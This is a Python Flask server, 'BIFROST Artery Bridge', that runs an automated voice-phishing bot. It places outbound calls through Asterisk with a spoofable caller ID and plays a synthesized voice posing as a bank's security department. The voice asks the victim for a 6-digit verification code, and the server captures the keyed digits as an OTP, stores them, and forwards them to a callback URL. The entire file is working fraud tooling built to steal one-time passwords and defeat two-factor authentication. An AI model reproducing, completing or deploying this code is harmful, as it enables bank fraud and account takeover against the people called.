"""
BIFROST Artery Bridge v2.0
Flask server that bridges BIFROST dashboard → Asterisk → PSTN

Endpoints:
  POST /call     - Initiate outbound P1 call
  POST /captured - Receive DTMF digits from Asterisk AGI
  GET  /otp      - Retrieve latest captured OTP
  GET  /health   - Health check
"""

import os
import uuid
import time
import json
import subprocess
import requests
from flask import Flask, request, jsonify
from threading import Lock

app = Flask(__name__)

# --- In-Memory OTP Store ---
otp_store = {}
otp_lock = Lock()

ASTERISK_SOUNDS = "/var/lib/asterisk/sounds/bifrost"
ASTERISK_SPOOL = "/var/spool/asterisk/outgoing"
ELEVENLABS_KEY = os.getenv("ELEVENLABS_API_KEY", "")

# --- CORS middleware ---
@app.after_request
def add_cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return response

@app.route("/health", methods=["GET"])
def health():
    # Quick Asterisk status check
    try:
        result = subprocess.run(
            ["asterisk", "-rx", "core show channels count"],
            capture_output=True, text=True, timeout=5
        )
        ast_status = "online" if result.returncode == 0 else "error"
    except:
        ast_status = "unreachable"

    return jsonify({
        "status": "online",
        "asterisk": ast_status,
        "bridge": "BIFROST Artery v2.0",
        "uptime": int(time.time())
    })


@app.route("/call", methods=["POST", "OPTIONS"])
def initiate_call():
    if request.method == "OPTIONS":
        return jsonify({}), 200

    data = request.get_json(force=True)
    target = data.get("target", "").strip()
    cid = data.get("cid", "0000000000").strip()
    prompt = data.get("prompt", "Hello, this is your bank's security department. We have detected unusual activity on your account. To verify your identity, please enter your 6-digit verification code followed by the pound key.")
    voice_id = data.get("voice_id", "21m00Tcm4TlvDq8ikWAM")
    callback_url = data.get("callback_url", "")

    if not target:
        return jsonify({"error": "Target number required"}), 400

    # Generate unique call ID
    call_id = str(uuid.uuid4())[:8]

    # --- Step 1: Generate TTS Audio via ElevenLabs ---
    audio_path = os.path.join(ASTERISK_SOUNDS, f"{call_id}.wav")
    tts_ok = generate_tts(prompt, voice_id, audio_path)

    if not tts_ok:
        return jsonify({"error": "TTS generation failed"}), 500

    # --- Step 2: Write Asterisk .call file ---
    call_file_content = f"""Channel: PJSIP/{target}@zadarma-endpoint
CallerID: "BIFROST" <{cid}>
MaxRetries: 0
RetryTime: 30
WaitTime: 45
Context: bifrost-p1
Extension: s
Priority: 1
Set: CALL_ID={call_id}
Set: CALLBACK_URL={callback_url}
"""

    # Write to temp first, then move to spool (atomic)
    tmp_path = f"/tmp/{call_id}.call"
    with open(tmp_path, "w") as f:
        f.write(call_file_content)

    # Set permissions and move to Asterisk spool
    os.chmod(tmp_path, 0o666)
    subprocess.run(["mv", tmp_path, os.path.join(ASTERISK_SPOOL, f"{call_id}.call")])

    # Initialize OTP store entry
    with otp_lock:
        otp_store[call_id] = {
            "target": target,
            "cid": cid,
            "status": "dialing",
            "otp": None,
            "timestamp": time.time()
        }

    return jsonify({
        "status": "dialing",
        "call_id": call_id,
        "target": target,
        "provider": "Asterisk/Zadarma",
        "info": "Call file dispatched to Asterisk"
    })


@app.route("/captured", methods=["POST", "GET"])
def captured():
    """Receives DTMF digits from Asterisk AGI script"""
    call_id = request.args.get("call_id") or request.form.get("call_id", "")
    digits = request.args.get("digits") or request.form.get("digits", "")

    if call_id and digits:
        with otp_lock:
            if call_id in otp_store:
                otp_store[call_id]["otp"] = digits
                otp_store[call_id]["status"] = "captured"
            else:
                otp_store[call_id] = {
                    "target": "unknown",
                    "cid": "",
                    "status": "captured",
                    "otp": digits,
                    "timestamp": time.time()
                }

        # If callback URL was provided, POST to BIFROST
        entry = otp_store.get(call_id, {})
        callback = entry.get("callback_url", "")
        if callback:
            try:
                requests.post(callback, json={
                    "call_id": call_id,
                    "otp": digits,
                    "target": entry.get("target", "")
                }, timeout=5)
            except:
                pass

        return jsonify({"status": "captured", "call_id": call_id, "otp": digits})

    return jsonify({"error": "Missing call_id or digits"}), 400


@app.route("/otp", methods=["GET"])
def get_otp():
    """Retrieve the latest captured OTP, or by call_id"""
    call_id = request.args.get("call_id", "")

    with otp_lock:
        if call_id and call_id in otp_store:
            return jsonify(otp_store[call_id])

        # Return the most recent capture
        if otp_store:
            latest = max(otp_store.items(), key=lambda x: x[1].get("timestamp", 0))
            return jsonify({"call_id": latest[0], **latest[1]})

    return jsonify({"status": "empty", "otp": None})


@app.route("/calls", methods=["GET"])
def list_calls():
    """List all tracked calls"""
    with otp_lock:
        return jsonify({"calls": dict(otp_store)})


def generate_tts(text, voice_id, output_path):
    """Generate TTS via ElevenLabs and convert to Asterisk-compatible WAV"""
    if not ELEVENLABS_KEY:
        # Fallback: use espeak
        try:
            print("Using espeak fallback...")
            res = subprocess.run([
                "espeak", "-w", output_path, text
            ], timeout=30, capture_output=True, text=True)
            if res.returncode != 0:
                print(f"espeak failed: {res.stderr}")
                return False
            # Convert to 8kHz mono for Asterisk
            convert_audio(output_path)
            return True
        except Exception as e:
            print(f"espeak exception: {e}")
            return False

    try:
        url = f"https://api.elevenlabs.io/v1/text-to-speech/{voice_id}"
        headers = {
            "Accept": "audio/mpeg",
            "Content-Type": "application/json",
            "xi-api-key": ELEVENLABS_KEY
        }
        payload = {
            "text": text,
            "model_id": "eleven_multilingual_v2",
            "voice_settings": {
                "stability": 0.6,
                "similarity_boost": 0.75
            }
        }

        response = requests.post(url, json=payload, headers=headers, timeout=30)

        if response.status_code == 200:
            # Save as MP3 first
            mp3_path = output_path.replace(".wav", ".mp3")
            with open(mp3_path, "wb") as f:
                f.write(response.content)

            # Convert MP3 → WAV (8kHz, 16-bit, mono for Asterisk)
            subprocess.run([
                "sox", mp3_path, "-r", "8000", "-c", "1", "-b", "16", output_path
            ], timeout=30)

            # Clean up MP3
            os.remove(mp3_path)
            return True
        else:
            print(f"TTS Error: {response.status_code} - {response.text[:200]}")
            return False

    except Exception as e:
        print(f"TTS Exception: {e}")
        return False


def convert_audio(path):
    """Convert any audio to Asterisk-compatible WAV"""
    tmp = path + ".tmp.wav"
    try:
        res = subprocess.run([
            "sox", path, "-r", "8000", "-c", "1", "-b", "16", tmp
        ], timeout=30, capture_output=True, text=True)
        if res.returncode != 0:
            print(f"sox failed: {res.stderr}")
        os.replace(tmp, path)
    except Exception as e:
        print(f"sox exception: {e}")


if __name__ == "__main__":
    os.makedirs(ASTERISK_SOUNDS, exist_ok=True)
    app.run(host="0.0.0.0", port=8080, debug=True)
